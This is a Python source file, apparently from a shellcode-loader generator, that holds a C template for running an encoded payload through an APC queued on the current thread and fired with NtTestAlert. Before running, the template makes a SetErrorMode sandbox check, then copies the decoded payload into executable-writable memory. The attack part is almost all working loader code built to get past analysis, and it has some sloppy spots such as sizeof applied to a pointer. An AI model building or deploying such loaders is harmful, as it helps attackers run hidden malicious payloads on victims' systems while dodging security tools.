###"Technical principle: https://idiotc4t.com/code-and-dll-process-injection/apc-and-nttestalert-code-execute"
from templates.template import *
class template(ITemplate):
    @staticmethod
    def get():
        c_code = '''
#include <windows.h>
#include <stdio.h>

typedef VOID(NTAPI* pNtTestAlert)(VOID);
<TABLES>
int main() {


  DWORD dwCode ;
  dwCode = SetErrorMode(0x400);
  dwCode = SetErrorMode(0x0);
  if (dwCode != 0x400)
  {
    return 0;
  }
                
	PCHAR lpBuffer = <ALLOC>
    <DECODE>
	
	pNtTestAlert NtTestAlert = (pNtTestAlert)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTestAlert");
	LPVOID lpBaseAddress = VirtualAlloc(NULL, sizeof(lpBuffer), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(lpBaseAddress, lpBuffer, sizeof(offset_table));
	QueueUserAPC((PAPCFUNC)lpBaseAddress, GetCurrentThread(), NULL);
	
	NtTestAlert();
	return 0;
}
    '''
        return c_code

